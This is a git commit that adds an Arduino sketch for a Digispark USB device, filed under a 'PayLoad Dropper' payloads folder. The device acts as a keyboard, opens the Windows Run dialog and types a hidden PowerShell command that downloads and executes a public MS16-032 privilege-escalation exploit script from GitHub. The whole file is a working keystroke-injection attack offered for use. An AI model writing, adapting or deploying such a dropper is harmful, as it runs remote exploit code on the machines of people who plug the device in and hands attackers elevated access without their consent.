b81336814de11d134911e40448447b0d91364579
Muhammad Talha Khan <MTK911@users.noreply.github.com>
2020-05-03 13:46:10 +0500

    Create Remote_PS_Exec.ino

---
+++ payloads/PayLoad Dropper/Remote_PS_Exec.ino
@@ -0,0 +1,17 @@
+#include "DigiKeyboard.h"
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+void loop() {
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell -windowstyle hidden -command IEX (iwr \"https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-032/MS16-032.ps1\")"); //Payload Dropper
+  DigiKeyboard.delay(500);
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+}
